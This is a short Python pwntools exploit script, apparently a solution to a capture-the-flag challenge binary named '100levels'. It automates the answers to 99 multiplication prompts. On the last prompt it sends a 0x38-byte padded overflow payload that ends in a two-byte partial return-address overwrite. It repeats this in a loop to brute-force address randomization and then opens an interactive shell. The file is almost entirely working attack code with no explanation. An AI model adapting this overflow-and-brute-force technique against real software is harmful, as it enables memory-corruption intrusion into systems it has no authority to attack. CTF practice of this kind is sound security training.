from pwn import *
import time
while True:
    #time.sleep(1)
    try:
        context.log_level = 'info'
        p = process("./100levels")
        #context.log_level = 'debug'
        p.recv()
        p.sendline('2')
        p.recv()
        p.sendline('1')
        p.recv()
        p.sendline('0')
        p.recv()
        p.sendline("50")

        for i in range(99):
            p.recvuntil('Question: ')
            a = int(p.recvuntil(" * ", drop=True))
            b = int(p.recvuntil(" =", drop=True))
            p.sendline(str(a * b))
        #context.log_level = 'debug'
        p.recvuntil('Question: ')
        a = int(p.recvuntil(" * ", drop=True))
        b = int(p.recvuntil(" =", drop=True))
        p.recvuntil(":")
        payload = str(a * b).ljust(0x38, '\x00') + '\x2c\x5d'
        p.send(payload)
        print(p.recv())
        p.interactive()
    except:
        print "failed"
